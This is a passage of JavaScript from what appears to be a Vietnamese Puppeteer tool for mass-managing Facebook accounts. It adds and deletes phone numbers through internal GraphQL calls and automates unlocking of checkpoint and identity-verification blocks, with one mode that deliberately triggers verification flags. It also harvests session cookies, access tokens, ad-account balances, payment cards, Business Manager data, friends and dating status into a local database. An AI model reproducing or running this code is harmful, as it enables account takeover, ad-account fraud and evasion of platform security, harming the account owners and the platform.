                                        const res = await z.post("https://accountscenter.facebook.com/api/graphql/", {
                                            "headers": {
                                                "content-type": "application/x-www-form-urlencoded",
                                            },
                                            "body": "av="+item.uid+"&__user="+item.uid+"&__a=1&__req=n&__hs=19819.HYP%3Aaccounts_center_pkg.2.1..0.0&dpr=1&__ccg=MODERATE&__rev=1012597635&__s=i3tiss%3Axlh5by%3Ahadsa6&__hsi=7354768042698684471&__dyn=7xeUmwlEnwn8K2Wmh0cm5U4e0yoW3q32360CEbo19oe8hw2nVE4W0om0MU2awpUO0n24o5-0Bo7O2l0Fwqo31w9O1lwlE-U2zxe2Gew9O22362W2K0zK1swa-7U1bobodEGdwtU2ewbS1LwTwNwLweq1Iwqo5u1Jwbe7E&__csr=ggN54sA_bHWkWqTZviiOiHgJarmlmKjAnX4BuBAT8DqGFqjGByqnlHuqAl6Q8-GCDDhZpqyrjAnVWgvAynHbBOCUDAV9994mviK8DBoB4mqiFbyGyk48GfKimfCwLUjK548CF6z8mKfzu78gG00jCq0clw2go0xa6E1399oaa-1Vw0E3Cw7hLjwwa10jw3cKEKcz8rx2uF8hGEmCIw4a41OwtV20-G58Ne2JwQWodO1Kqfxx341IGoUC5oJ2GwkUy-0gu4Uhglg2-yFE&__comet_req=5&fb_dtsg="+data.fb_dtsg+"&jazoest=25424&lsd=zt83RSmasD2ufjgVKnWMlR&__spin_r=1012597635&__spin_b=trunk&__spin_t=1712415377&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=FXAccountsCenterAddContactPointMutation&variables=%7B%22country%22%3A%22VN%22%2C%22contact_point%22%3A%22"+phone+"%22%2C%22contact_point_type%22%3A%22phone_number%22%2C%22selected_accounts%22%3A%5B%22"+item.uid+"%22%5D%2C%22family_device_id%22%3A%22device_id_fetch_datr%22%2C%22client_mutation_id%22%3A%22mutation_id_1712415432544%22%7D&server_timestamps=true&doc_id=6970150443042883",
                                        })

                                        if (res.includes('FXCALSettingsMutationReturnDataSuccess')) {

                                            send('message', {id: item.id, message: 'Đang xóa số điện thoại'})

                                            const res2 = await z.post("https://accountscenter.facebook.com/api/graphql/", {
                                                "headers": {
                                                    "content-type": "application/x-www-form-urlencoded",
                                                },
                                                "body": "av="+item.uid+"&__user="+item.uid+"&__a=1&__req=m&__hs=19819.HYP%3Aaccounts_center_pkg.2.1..0.0&dpr=1&__ccg=MODERATE&__rev=1012597635&__s=ak050e%3A2tw4z2%3As3h1lv&__hsi=7354771211581658784&__dyn=7xeUmwlEnwn8K2Wmh0cm5U4e0yoW3q32360CEbo19oe8hw2nVE4W0om0MU2awpUO0n24o5-0Bo7O2l0Fwqo31w9O1lwlE-U2zxe2Gew9O22362W2K0zK1swa-7U1bobodEGdwtU2ewbS1LwTwNwLweq1Iwqo5u1Jwbe7E&__csr=ggN54sA_bHWkWqTZviiOiHgOFJplqVehvIilWmjtJSmFqjGByqnlHuqAl6Q8-GCDDhZpqyrjAnVWgvAynHbBOCUDAV9994mviK8DBoB4mqiFbyGyk48GfKimfCwLUjK548CF6z8mKfzu78gG00jCq0clw2go0xa6E1399oaa-1Vw0E3Cw7hLjwwa10jw3cKEKcz8rx2uF8hGEmCIw4a41OwtV20-G58Ne2JwQWodO1Kqfxx341IGoUC5oJ2GwkUy-0gu4Uhglg2-yFE&__comet_req=5&fb_dtsg="+data.fb_dtsg+"&jazoest=25756&lsd=IAOnBnwunQcmkGlIShcEyI&__spin_r=1012597635&__spin_b=trunk&__spin_t=1712416115&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=FXAccountsCenterDeleteContactPointMutation&variables=%7B%22normalized_contact_point%22%3A%22%2B84"+phone+"%22%2C%22contact_point_type%22%3A%22PHONE_NUMBER%22%2C%22selected_accounts%22%3A%5B%22"+item.uid+"%22%5D%2C%22client_mutation_id%22%3A%22mutation_id_1712416197156%22%2C%22family_device_id%22%3A%22device_id_fetch_datr%22%7D&server_timestamps=true&doc_id=6716611361758391",
                                            })

                                            if (res2.includes('FXCALSettingsMutationReturnDataSuccess')) {

                                                send('message', {id: item.id, message: 'Xóa số điện thoại thành công'})

                                            } else {
                                                send('message', {id: item.id, message: 'Xóa số điện thoại thất bại'})
                                            }

                                        } else {
                                            send('message', {id: item.id, message: 'Thêm số điện thoại thất bại'})
                                        }

                                    } catch (err) {
                                        console.log(err)
                                    }

                                }

                            }
                            
                            if (mode === 'khang282') {

                                const xmdt = new Xmdt(page, item, setting, ip)

                                let url 

                                url = await page.url()

                                if (setting.da282.value && url.includes('1501092823525282')) {
                                    
                                    try {

                                        send('message', {id: item.id, message: 'Đang đá 282 -> 956'})

                                        await xmdt.da282()

                                        send('message', {id: item.id, message: 'Đá thành công'})

                                    } catch {

                                        send('message', {id: item.id, message: 'Đá thất bại'})

                                    }
                                }

                                url = await page.url()

                                if (setting.khang282.value && url.includes('1501092823525282')) {

                                    try {

                                        try {

                                            await page.waitForXPath("//*[contains(text(), 'đã gửi đơn kháng nghị')]", {
                                                timeout: 10000
                                            })

                                            send('updateStatus', {id: item.id, status: 'Đang kháng 282'})

                                        } catch {

                                            send('message', {id: item.id, message: 'Đang tiến hành mở khóa 282'})

                                            await xmdt.khang282Api(message => {
                                                send('message', {id: item.id, message})
                                            })
            
                                            send('message', {id: item.id, message: 'Mở khóa 282 thành công'})

                                            send('updateStatus', {id: item.id, status: 'Đang kháng 282'})
            
                                            lastMsg = 'Mở khóa 282 thành công'
            
                                        }

                                    } catch (err) {

                                        console.log(err)

                                        if (err) {
                                            send('message', {id: item.id, message: 'Mở khóa 282 thất bại: '+err})
                                        } else {
                                            send('message', {id: item.id, message: 'Mở khóa 282 thất bại'})
                                        }
                                        
                                    }

                                }


                                if (setting.moKhoaHom.value && url.includes('828281030927956')) {

                                    try {

                                        const result = await checkImap(item.email, item.passMail)

                                        if (result) {

                                            send('message', {id: item.id, message: 'Đang tiến hành mở khóa hòm'})

                                            try {

                                                await xmdt.moKhoaHom(message => {
                                                    send('message', {id: item.id, message})
                                                })

                                                send('message', {id: item.id, message: 'Mở khóa hòm thành công'})

                                                await page.waitForTimeout(10000)

                                                await page.reload()

                                                const button = await page.$('a[href^="/x/checkpoint/828281030927956/stepper/"]') || false

                                                if (button) {
                                                    send('message', {id: item.id, message: 'Mở khóa hòm thành công'})
                                                } else {
                                                    send('message', {id: item.id, message: 'Mở khóa hòm thất bại'})
                                                }

                                            } catch {
                                                send('message', {id: item.id, message: 'Mở khóa hòm thất bại'})
                                            } 

                                        } else {
                                            send('message', {id: item.id, message: 'Mở khóa hòm thất bại: Mail die'})
                                        }

                                    } catch {}

                                }

                                if (setting.khang956.value && url.includes('828281030927956')) {

                                    try {

                                        let result = true
                                        let page2 = false

                                        if (setting.readEmailMode.value === 'browser') {

                                            page2 = await browser.newPage()

                                            const hotmail = new Hotmail(page2, setting, item, ip)

                                            try {

                                                await hotmail.login(message => {
                                                    send('message', {id: item.id, message: 'HOTMAIL: '+message})
                                                })

                                                await page.bringToFront()

                                            } catch {
                                                error = true
                                            }

                                        } else {
                                            result = await checkImap(item.email, item.passMail)
                                        }

                                        if (result) {

                                            if (!error) {

                                                send('message', {id: item.id, message: 'Đang tiến hành mở khóa 956'})

                                                await xmdt.khang956Api(message => {
                                                    send('message', {id: item.id, message})
                                                }, page2)

                                                send('message', {id: item.id, message: 'Mở khóa 956 thành công'})

                                                lastMsg = 'Mở khóa 956 thành công'

                                            }

                                        } else {
                                            send('message', {id: item.id, message: 'Mở khóa 956 thất bại: Mail die'})
                                        }

                                        

                                    } catch (err) {
                                        setting.getInfo.value = false
                                    }

                                }

                                if (setting.khang956.value) {

                                    try {

                                        await page.waitForSelector('[name="verification_method"]', {timeout: 5000})

                                        try {

                                            let result = true
                                            let page2 = false

                                            if (setting.readEmailMode.value === 'browser') {

                                                page2 = await browser.newPage()

                                                const hotmail = new Hotmail(page2, setting, item, ip)

                                                try {

                                                    await hotmail.login(message => {
                                                        send('message', {id: item.id, message: 'HOTMAIL: '+message})
                                                    })

                                                    await page.bringToFront()

                                                } catch {
                                                    error = true
                                                }

                                            } else {
                                                result = await checkImap(item.email, item.passMail)
                                            }
                                            
                                            if (result) {

                                                send('message', {id: item.id, message: 'Đang tiến hành mở CP mail'})

                                                const password = await xmdt.moCheckPointMail2(message => {
                                                    send('message', {id: item.id, message})
                                                }, page2)

                                                if (password) {
                                                    send('updatePassword', {
                                                        id: item.id,
                                                        new: password
                                                    })
                                                }

                                                send('message', {id: item.id, message: 'Mở CP mail thành công'})

                                            } else {
                                                send('message', {id: item.id, message: 'Mở CP mail thất bại: Mail die'})
                                            }

                                        } catch {}


                                    } catch {}

                                    // try {

                                    //     await page.waitForSelector('a[href*="secure_account_learn_more"]', {timeout: 5000})

                                    //     try {

                                    //         let result = true
                                    //         let page2 = false

                                    //         if (setting.readEmailMode.value === 'browser') {

                                    //             page2 = await browser.newPage()

                                    //             const hotmail = new Hotmail(page2, setting, item, ip)

                                    //             try {

                                    //                 await hotmail.login(message => {
                                    //                     send('message', {id: item.id, message: 'HOTMAIL: '+message})
                                    //                 })

                                    //                 await page.bringToFront()

                                    //             } catch {
                                    //                 error = true
                                    //             }

                                    //         } else {
                                    //             result = await checkImap(item.email, item.passMail)
                                    //         }
                                            
                                    //         if (result) {

                                    //             send('message', {id: item.id, message: 'Đang tiến hành mở CP mail'})

                                    //             const password = await xmdt.moCheckPointMail(message => {
                                    //                 send('message', {id: item.id, message})
                                    //             }, page2)

                                    //             if (password) {
                                    //                 send('updatePassword', {
                                    //                     id: item.id,
                                    //                     new: password
                                    //                 })
                                    //             }

                                    //             send('message', {id: item.id, message: 'Mở CP mail thành công'})

                                    //         } else {
                                    //             send('message', {id: item.id, message: 'Mở CP mail thất bại: Mail die'})
                                    //         }

                                    //     } catch {
                                    //         send('message', {id: item.id, message: 'Mở CP mail thất bại'})
                                    //     }

                                    // } catch {}
                                }

                            }

                            if (mode === 'dameXmdt') {

                                send('message', {id: item.id, message: 'Đang Dame XMDT'})

                                try {

                                    const xmdt = new Xmdt(page, item, setting, ip, data.fb_dtsg, data.accessToken, data.lsd, '')
                                    const account = new Account(page, item.uid, item.twofa, data.fb_dtsg, data.accessToken, data.lsd)

                                    await xmdt.dameXmdt()

                                    await page.waitForTimeout(10000)

                                    send('message', {id: item.id, message: 'Đang kiểm tra trạng thái'})

                                    let quality = await account.getAccountQuality()

                                    if (quality.status !== 'Live Ads - Không Sao Cả') {

                                        send('message', {id: item.id, message: 'Dame XMDT thành công'})

                                        send('updateStatus', {id: item.id, status: quality.status})

                                        send('unCheckItem', item.id)

                                    } else {

                                        error = true 

                                        send('message', {id: item.id, message: 'Dame XMDT chưa thành công'})
                                    }


                                } catch (err) {

                                    error = true 
                                    send('message', {id: item.id, message: 'Dame XMDT chưa thành công'})

                                }

                                const checkPoint = await checkPointDetector(page)

                                if (checkPoint) {

                                    send('updateStatus', {id: item.id, status: checkPoint})
                                    send('unCheckItem', item.id)

                                }
                            
                            }

                            // Lấy thông tin tài khoản quảng cáo

                            if (mode === 'getInfo' && !error ) {
                                setting.getInfo.value = true
                            }

                            if (mode !== 'viewChrome' && mode !== 'adCheck' && !error && setting.getInfo.value) {

                                if (!data) {
                                    data = await getAccessToken(page)
                                }

                                const account = new Account(page, item.uid, item.twofa, data.fb_dtsg, data.accessToken, data.lsd)

                                await page.waitForTimeout(5000)

                                let adData = {}
                                let token = ''

                                if (setting.infoTkqc.value && !error) {

                                    try {

                                        send('message', {id: item.id, message: 'Đang lấy thông tin TKQC'})

                                        let adAccounts = await account.getAdAccounts()

                                        if (adAccounts.length > 0) {

                                            let adAccountId = false

                                            try {

                                                adAccountId = await account.getMainAdAccount()

                                            } catch {

                                                adAccountId = adAccounts[0].id.replace('act_', '')

                                            }

                                            adData = (adAccounts.filter(item => item.id === adAccountId))[0]

                                            const adAccount2 = []
                                            const accountStatus2 = []

                                            const convert = ['EUR', 'BRL', 'USD', 'CNY', 'MYR', 'UAH', 'QAR', 'THB', 'THB', 'TRY', 'GBP', 'PHP', 'INR']

                                            if (convert.includes(adData.currency)) {
                                                adData.balance = (parseInt(adData.balance) / 100)
                                                adData.threshold = (parseInt(adData.threshold) / 100)
                                            }

                                            for (let index = 0; index < adAccounts.length; index++) {

                                                try { process.kill(browser.process().pid, 0)} catch { break }

                                                if (adAccounts[index].status === 2) {
                                                    accountStatus2.push(adAccounts[index].id)
                                                }

                                                if (adAccounts[index].status === 1) {

                                                    if (convert.includes(adAccounts[index].currency)) {
                                                        adAccounts[index].balance = (parseInt(adAccounts[index].balance) / 100)
                                                        adAccounts[index].threshold = (parseInt(adAccounts[index].threshold) / 100)
                                                    }

                                                    adAccounts[index].balance = adAccounts[index].balance ? parseInt(adAccounts[index].balance) : 0
                                                    adAccounts[index].spend = adAccounts[index].spend ? parseInt(adAccounts[index].spend) : 0
                                                    adAccounts[index].threshold = adAccounts[index].threshold ? parseInt(adAccounts[index].threshold) : 0

                                                    if (adAccounts[index].threshold > 0) {

                                                        let balance = 0

                                                        const threshold = await currencyConverter.from(adAccounts[index].currency).to('VND').amount(adAccounts[index].threshold).convert()

                                                        try {

                                                            balance = await currencyConverter.from(adAccounts[index].currency).to('VND').amount(adAccounts[index].balance).convert()

                                                        } catch {}

                                                        adAccount2.push({
                                                            id: adAccounts[index].id,
                                                            role: adAccounts[index].role,
                                                            status: adAccounts[index].status,
                                                            currency: adAccounts[index].currency,
                                                            threshold: threshold,
                                                            remain: threshold - balance
                                                        })

                                                    }

                                                }
                                                
                                            }

                                            const account273 = []

                                            for (let index = 0; index < accountStatus2.length; index++) {

                                                try { process.kill(browser.process().pid, 0)} catch { break }

                                                const item = accountStatus2[index]
                                                const status = await account.check273(item)

                                                if (status) {
                                                    account273.push(item)
                                                }

                                            }

                                            let bestAcc = false

                                            if (adAccount2.length > 0) {

                                                bestAcc = adAccount2.reduce((accumulator, current) => {
                                                    return accumulator.threshold > current.threshold ? accumulator : current
                                                })

                                                bestAcc.threshold = Math.ceil(bestAcc.threshold)
                                                bestAcc.remain = Math.ceil(bestAcc.remain)

                                            }

                                            adData.remain = adData.threshold - adData.balance

                                            adData.limit = (new Intl.NumberFormat('en-US').format(adData.limit)).replace('NaN', '')
                                            adData.spend = (new Intl.NumberFormat('en-US').format(adData.spend)).replace('NaN', '')
                                            adData.remain = (new Intl.NumberFormat('en-US').format(adData.remain)).replace('NaN', '')
                                            adData.balance = (new Intl.NumberFormat('en-US').format(adData.balance)).replace('NaN', '')
                                            adData.threshold = (new Intl.NumberFormat('en-US').format(adData.threshold)).replace('NaN', '')
                                            bestAcc.threshold = (new Intl.NumberFormat('en-US').format(bestAcc.threshold)).replace('NaN', '')
                                            bestAcc.remain = (new Intl.NumberFormat('en-US').format(bestAcc.remain)).replace('NaN', '')


                                            let statusText = 'N/A'

                                            if (adData.status === 1) {
                                                statusText = 'LIVE'
                                            }
                                            
                                            if (adData.status === 2) {
                                                statusText = 'DIE'
                                            }
                                            
                                            if (adData.status === 3) {
                                                statusText = 'NỢ (' + adData.threshold + '/' + adData.remain + ' ' + adData.currency + ')'
                                            }

                                            const checkHold = await account.checkHold(adAccountId)

                                            if (checkHold.status) {
                                                statusText = 'HOLD'
                                            }

                                            if (bestAcc) {
                                                adData.bestAcc = bestAcc ? bestAcc.threshold+'/'+bestAcc.remain+' - '+bestAcc.role+' - '+bestAcc.id : ''
                                            }

                                            adData.limit = adData.limit+' '+adData.currency + ' - ' + statusText
                                            adData.userCount = adAccounts.length
                                            adData.account273 = account273.length > 0 ? 'SL:'+account273.length+' | '+account273.join(',') : ' '
                                            adData.country = checkHold.country

                                        } else {
                                            send('updateInfo', {
                                                id: item.id, 
                                                limit: 'NOTHING'
                                            })
                                        }

                                    } catch (err) {

                                        error = true

                                        send('message', {id: item.id, message: 'Lấy thông tin TKQC thất bại'})
                                        log(err)

                                    }

                                }

                                adData.id = item.id

                                if (setting.infoQuality.value && !error) {

                                    send('message', {id: item.id, message: 'Đang lấy thông tin trạng thái TK'})

                                    try {
                                        const accountQuality = await account.getAccountQuality()
                                        adData.quality = accountQuality.status

                                    } catch {

                                        error = true

                                        send('message', {id: item.id, message: 'Lấy thông tin trạng thái TK thất bại'})
                                    }

                                }

                                if (setting.infoBm.value && !error) {

                                    try {

                                        send('message', {id: item.id, message: 'Đang lấy thông tin BM'})

                                        let accBm = []

                                        try {

                                            accBm = await account.getBm()

                                        } catch {}

                                        if (accBm.length > 0) {
                                        
                                            const bmStatus = await account.getBmStatus()

                                            const bmXmdn = []
                                            const bm350Live = []
                                            const bm350Die = []
                                            const bm50Live = []
                                            const bm50Die = []
                                            const bmNoLimitDie = []
                                            const bmNoLimitLive = []
                                            const bmDieVinhVien = []
                                            const bmKhang350 = []
                                            const bmKhang50 = []
                                            const bmKhangNoLimit = []
                                            const bmDieDangKhang = []

                                            for (let index = 0; index < accBm.length; index++) {

                                                try { process.kill(browser.process().pid, 0)} catch { break }
                                                
                                                const id = accBm[index].id

                                                const status = (bmStatus.filter(item => item.id === id))[0].type

                                                if (accBm[index].verification_status === 'verified') {
                                                    bmXmdn.push(id)
                                                }

                                                if (accBm[index].sharing_eligibility_status === 'enabled' && status === 'DIE') {
                                                    bm350Die.push(id)
                                                }

                                                if (accBm[index].sharing_eligibility_status === 'enabled' && status === 'LIVE') {
                                                    bm350Live.push(id)
                                                }

                                                if (accBm[index].sharing_eligibility_status === 'disabled_due_to_trust_tier' && status === 'DIE') {
                                                    bm50Die.push(id)
                                                }

                                                if (accBm[index].sharing_eligibility_status === 'disabled_due_to_trust_tier' && status === 'LIVE') {
                                                    bm50Live.push(id)
                                                }

                                                if (accBm[index].sharing_eligibility_status !== 'disabled_due_to_trust_tier' && accBm[index].sharing_eligibility_status !== 'enabled' && status === 'DIE') {
                                                    bmNoLimitDie.push(id)
                                                }

                                                if (accBm[index].sharing_eligibility_status !== 'disabled_due_to_trust_tier' && accBm[index].sharing_eligibility_status !== 'enabled' && status === 'LIVE') {
                                                    bmNoLimitLive.push(id)
                                                }

                                                if (status === 'DIE_VV') {
                                                    bmDieVinhVien.push(id)
                                                }

                                                if (status === 'DIE_DK') {
                                                    bmDieDangKhang.push(id)
                                                }

                                                if (accBm[index].sharing_eligibility_status === 'enabled' && status === 'BM_KHANG') {
                                                    bmKhang350.push(id)
                                                }

                                                if (accBm[index].sharing_eligibility_status === 'disabled_due_to_trust_tier' && status === 'BM_KHANG') {
                                                    bmKhang50.push(id)
                                                }

                                                if (accBm[index].sharing_eligibility_status !== 'disabled_due_to_trust_tier' && accBm[index].sharing_eligibility_status !== 'enabled' && status === 'BM_KHANG') {
                                                    bmKhangNoLimit.push(id)
                                                }

                                                
                                            }

                                            const promises = []

                                            for (let index = 0; index < accBm.length; index++) {

                                                const getLimit = () => {
                                                    return new Promise(async (resolve, reject) => {
                                                        try {
                                                            accBm[index].limit = await account.getBmLimit(accBm[index].id)
                                                        } catch {
                                                            accBm[index].limit = 0
                                                        }

                                                        resolve()
                                                    })
                                                }

                                                promises.push(getLimit())
                                                
                                            }

                                            await Promise.all(promises)
                                            
                                            const bestBm = accBm.sort((a, b) => {
                                                return b.limit - a.limit
                                            })

                                            if (bmXmdn.length > 0) {
                                                adData.bmXmdn = 'SL:'+bmXmdn.length+' | '+bmXmdn.join(', ')
                                            } else {
                                                adData.bmXmdn = ' '
                                            }

                                            if (bm350Live.length > 0) {
                                                adData.bm350Live = 'SL:'+bm350Live.length+' | '+bm350Live.join(', ')
                                            } else {
                                                adData.bm350Live = ' '
                                            }

                                            if (bm350Die.length > 0) {
                                                adData.bm350Die = 'SL:'+bm350Die.length+' | '+bm350Die.join(', ')
                                            } else {
                                                adData.bm350Die = ' '
                                            }

                                            if (bm50Live.length > 0) {
                                                adData.bm50Live = 'SL:'+bm50Live.length+' | '+bm50Live.join(', ')
                                            } else {
                                                adData.bm50Live = ' '
                                            }

                                            if (bm50Die.length > 0) {
                                                adData.bm50Die = 'SL:'+bm50Die.length+' | '+bm50Die.join(', ')
                                            } else {
                                                adData.bm50Die = ' '
                                            }

                                            if (bmNoLimitLive.length > 0) {
                                                adData.bmNoLimitLive = 'SL:'+bmNoLimitLive.length+' | '+bmNoLimitLive.join(', ')
                                            } else {
                                                adData.bmNoLimitLive = ' '
                                            }

                                            if (bmDieVinhVien.length > 0) {
                                                adData.bmDieVinhVien = 'SL:'+bmDieVinhVien.length+' | '+bmDieVinhVien.join(', ')
                                            } else {
                                                adData.bmDieVinhVien = ' '
                                            }

                                            if (bmKhang350.length > 0) {
                                                adData.bmKhang350 = 'SL:'+bmKhang350.length+' | '+bmKhang350.join(', ')
                                            } else {
                                                adData.bmKhang350 = ' '
                                            }

                                            if (bmKhang50.length > 0) {
                                                adData.bmKhang50 = 'SL:'+bmKhang50.length+' | '+bmKhang50.join(', ')
                                            } else {
                                                adData.bmKhang50 = ' '
                                            }

                                            if (bmKhangNoLimit.length > 0) {
                                                adData.bmKhangNoLimit = 'SL:'+bmKhangNoLimit.length+' | '+bmKhangNoLimit.join(', ')
                                            } else {
                                                adData.bmKhangNoLimit = ' '
                                            }

                                            if (bmDieDangKhang.length > 0) {
                                                adData.bmDieDangKhang = 'SL:'+bmDieDangKhang.length+' | '+bmDieDangKhang.join(', ')
                                            } else {
                                                adData.bmDieDangKhang = ' '
                                            }

                                            const bestBmStatus = (bmStatus.filter(item => item.id === bestBm[0].id))[0].text

                                            adData.bm = accBm.length
                                            adData.bestBm = accBm.length > 0 ? bestBm[0].limit+' - '+bestBm[0].permitted_roles[0]+ ' - ' +bestBmStatus + ' - ' +bestBm[0].id : ''

                                        } else {
                                            send('message', {id: item.id, message: 'Không có BM'})
                                        }

                                    } catch (err) {

                                        log(err)

                                        error = true

                                        send('message', {id: item.id, message: 'Lấy thông tin BM thất bại'})
                                    }
                                }

                                if (setting.infoPage.value && !error) {
                                    try {

                                        send('message', {id: item.id, message: 'Đang lấy thông tin page'})

                                        const accessToken = await getAccessToken3(page, item.uid, data.fb_dtsg, item.twofa)

                                        const fbPage = new Page(page, item, data.fb_dtsg, accessToken, data.lsd)

                                        const checkPage = await fbPage.checkPage()

                                        const pageLive = checkPage.filter(item => item.status === 'Live').map(item => item.id)
                                        const pageKhang = checkPage.filter(item => item.status === 'Page kháng').map(item => item.id)
                                        const pageXmdt = checkPage.filter(item => item.status === 'XMDT').map(item => item.id)
                                        const pageCanKhang = checkPage.filter(item => item.status === 'Cần kháng').map(item => item.id)
                                        const pageDangKhang = checkPage.filter(item => item.status === 'Đang kháng').map(item => item.id)
                                        const pageHcvv = checkPage.filter(item => item.status === 'Hạn chế vĩnh viễn').map(item => item.id)
                                        const pageLiveStream = checkPage.filter(item => item.liveStream).map(item => item.id)

                                        adData.pageHcvv = pageHcvv.length > 0 ? 'SL:'+pageHcvv.length+' | '+pageHcvv.join(',') : ' '
                                        adData.pageDangKhang = pageDangKhang.length > 0 ? 'SL:'+pageDangKhang.length+' | '+pageDangKhang.join(',') : ' '
                                        adData.pageCanKhang = pageCanKhang.length > 0 ? 'SL:'+pageCanKhang.length+' | '+pageCanKhang.join(',') : ' '
                                        adData.pageKhang = pageKhang.length > 0 ? 'SL:'+pageKhang.length+' | '+pageKhang.join(',') : ' '
                                        adData.pageXmdt = pageXmdt.length > 0 ? 'SL:'+pageXmdt.length+' | '+pageXmdt.join(',') : ' '
                                        adData.pageLive = pageLive.length > 0 ? 'SL:'+pageLive.length+' | '+pageLive.join(',') : ' '
                                        adData.pageLiveStream = pageLiveStream.length > 0 ? 'SL:'+pageLiveStream.length+' | '+pageLiveStream.join(',') : ' '
                                        
                                        adData.page = checkPage.length


                                    } catch (err) {

                                        console.log(err)
                                        
                                        error = true

                                        send('message', {id: item.id, message: 'Lấy thông tin page thất bại'})
                                    }
                                }

                                if (setting.spendPage.value && !error) {

                                    try {

                                        send('message', {id: item.id, message: 'Đang lấy page chi tiêu'})

                                        const pages = await account.checkPageMessage(setting.pageMessage.value)

                                        if (pages.length > 0) {
                                            adData.spendPage = pages.length > 0 ? 'SL:'+pages.length+' | '+pages.join(',') : ' '
                                        }

                                    } catch {

                                        error = true

                                        send('message', {id: item.id, message: 'Lấy page chi tiêu thất bại'})
                                    }
                                }

                                if (setting.infoAccount.value && !error) {
                                    try {

                                        send('message', {id: item.id, message: 'Đang lấy thông tin cá nhân'})

                                        const userData = await account.getUserData()

                                        adData.birthday = userData.birthday

                                        adData.name = userData.name
                                        adData.gender = userData.gender
                                        adData.firstName = userData.first_name
                                        adData.lastName = userData.last_name
                                        adData.country = userData.locale.split('_')[1]

                                        token = userData.accessToken


                                    } catch {

                                        error = true

                                        send('message', {id: item.id, message: 'Lấy thông tin cá nhân thất bại'})
                                    }
                                }

                                if (setting.checkSupport.value && !error) {

                                    send('message', {id: item.id, message: 'Đang kiểm tra trạng thái chat SP'})

                                    adData.support = await account.checkSupport()

                                }

                                if (setting.infoFriend.value && !error) {
                                    try {

                                        send('message', {id: item.id, message: 'Đang lấy thông tin bạn bè'})

                                        adData.friends = await account.getFriends()

                                    } catch {

                                        error = true

                                        send('message', {id: item.id, message: 'Lấy thông tin bạn bè thất bại'})
                                    }
                                }
                                
                                if (setting.infoDating.value && !error) {

                                    try {

                                        send('message', {id: item.id, message: 'Đang lấy thông tin hẹn hò'})

                                        adData.dating = await account.checkDating()

                                    } catch {

                                        error = true

                                        send('message', {id: item.id, message: 'Lấy thông tin hẹn hò thất bại'})
                                    }
                                }

                                send('updateInfo', adData)

                                if (setting.infoCookie.value && !error) {

                                    await page.waitForTimeout(3000)

                                    try {

                                        send('message', {id: item.id, message: 'Đang lấy cookie'})

                                        let cookies = await page.cookies()

                                        cookies = cookies.map(item => {
                                            return item.name+'='+item.value
                                        }).join('; ')

                                        send('updateCookie', {
                                            id: item.id,
                                            cookies,
                                        })


                                    } catch (err) { 
                                        
                                        error = true
                                        
                                        send('message', {id: item.id, message: 'Lấy cookie thất bại'})
                                    }
                                }

                                if (setting.infoToken.value && !error) {

                                    await page.waitForTimeout(3000)

                                    try {

                                        send('message', {id: item.id, message: 'Đang lấy token'})

                                        if (!token) {
                                            token = await getAccessToken3(page, item.uid, data.fb_dtsg, item.twofa)
                                        }

                                        send('updateToken', {
                                            id: item.id,
                                            token,
                                        })

                                    } catch (err) { 
                                        
                                        error = true
                                        
                                        send('message', {id: item.id, message: 'Lấy token thất bại'})
                                    }
                                }

                                if (!error) {
                                    send('message', {id: item.id, message: 'Lấy thông tin tài khoản thành công'})
                                }

                            }

                            if (mode === 'adCheck' && !error) {

                                try {

                                    send('message', {id: item.id, message: 'Đang lấy thông tin TKQC'})

                                    const account = new Account(page, item.uid, item.twofa, data.fb_dtsg, data.accessToken, data.lsd)

                                    const userData = await account.getUserData()
                                    
                                    try {

                                        const quality = await account.getAccountQuality()

                                        userData.status = quality.status

                                    } catch {}

                                    const cookies = await page.cookies()

                                    userData.cookies = cookies.map(item => {
                                        return item.name+'='+item.value
                                    }).join('; ')

                                    const adAccounts = await account.getAdAccounts()

                                    const tkqc = new Db('ads/tkqc')
                                    const ads = new Db('ads')

                                    userData.count = adAccounts.length

                                    await ads.insert(userData)

                                    for (let index = 0; index < adAccounts.length; index++) {

                                        try { process.kill(browser.process().pid, 0)} catch { break }

                                        try {

                                            const checkHold = await account.checkHold(adAccounts[index].id)

                                            if (checkHold.status) {
                                                adAccounts[index].account_status = 999
                                            }

                                            adAccounts[index].country = checkHold.country

                                        } catch {}


                                        try {

                                            adAccounts[index].cards = await account.getCard(adAccounts[index].id)

                                        } catch {}

                                        adAccounts[index].uid = item.uid

                                        await tkqc.insert(adAccounts[index])
                                    
                                        await page.waitForTimeout(1000)

                                    }

                                    send('message', {id: item.id, message: 'Lấy thông tin TKQC thành công'})

                                } catch (err) {
                                    console.log(err)
                                    send('message', {id: item.id, message: 'Lấy thông tin TKQC thất bại'})
                                }


                            }

                            clearTimeout(timer)
                            clearInterval(checkBrowser)

                            // Kiểm tra checkpoint

                            try {

                                // Kiểm tra checkpoint

                                const checkPoint = await checkPointDetector(page, item.uid)

                                if (checkPoint) {

                                    send('updateStatus', {id: item.id, status: checkPoint})
                                    send('countCheckpoint', {})

                                }

                            } catch {

                            }

                        }

                    }

                    // Đóng browser
                
                    if (mode !== 'viewChrome' && !setting.keepChrome.value) {
                        await browser.close()
                    }

                }

            }

            if (lastMsg) {
                send('message', {id: item.id, message: lastMsg})
            }

            // Final 

            if (error) {

                const time = moment().format('DD/MM/YYYY - H:m:s')

                send('finish', {item, time})

                reject()


            } else {

                send('clearCheckpoint', {})

                const time = moment().format('DD/MM/YYYY - H:m:s')

                send('finish', {item, time})

                resolve()

            }

        } catch (err) {

            if (mode !== 'viewChrome' && !setting.keepChrome.value) {
                try { await browser.close() } catch {}
            }

            const time = moment().format('DD/MM/YYYY - H:m:s')

            send('finish', {item, time})

            reject()

        }

    })

}


